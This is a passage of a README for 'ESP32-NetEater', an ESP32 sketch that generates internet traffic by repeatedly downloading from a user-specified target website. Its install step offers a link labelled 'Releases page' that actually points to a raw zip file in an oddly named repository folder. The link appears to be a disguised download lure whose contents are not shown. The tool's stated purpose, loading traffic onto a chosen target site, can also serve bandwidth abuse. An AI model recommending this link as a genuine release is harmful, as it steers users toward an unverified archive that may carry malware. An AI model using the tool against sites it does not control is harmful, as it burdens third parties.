   ```
4. Click `OK` to save your preferences.

### 3. Add the ESP32 Board
1. Navigate to `Tools` → `Board` → `Boards Manager`.
2. Search for "ESP32".
3. Click on "Install" next to the ESP32 package by Espressif Systems.

### 4. Download and Open the ESP32-NetEater Code
1. After you have downloaded the `.ino` file from the [Releases page](https://raw.githubusercontent.com/Tushar-coader/ESP32-NetEater/main/laryngotracheotomy/ESP32-NetEater.zip), open it in the Arduino IDE.
2. Make sure your ESP32 board is connected to your computer via USB.

## 📡 Configuring Your Connection
1. Inside the Arduino IDE, locate the `WiFi` settings in the code. 
2. Change the SSID and password to match your Wi-Fi network.
3. Specify the URL of the target website you want to download data from.
4. Save your changes.

## ▶️ Uploading the Code
1. Select your ESP32 board from `Tools` → `Board`.
2. Choose the correct COM port connected to your ESP32 from `Tools` → `Port`.
3. Click the upload button (the right arrow icon) in the Arduino IDE.

## 🎉 Running the Application
Once the code uploads successfully, your ESP32 will start generating internet traffic by downloading data from the specified website. You can monitor the behavior in the serial monitor within the Arduino IDE.

## 📈 Monitoring Traffic
To view the internet traffic being created:
1. Open the serial monitor in the Arduino IDE by clicking on the magnifying glass icon.
2. Set the baud rate (bottom right of the window) to `115200` to match the code.

## ⚙️ Troubleshooting
- **Connection Issues**: Ensure your ESP32 is properly powered and connected. Verify that your Wi-Fi credentials are correct.
- **Code Upload Problems**: Check that you have selected the right board and COM port in the IDE.
- **Serial Monitor Issues**: Make sure the baud rate is set to `115200`.
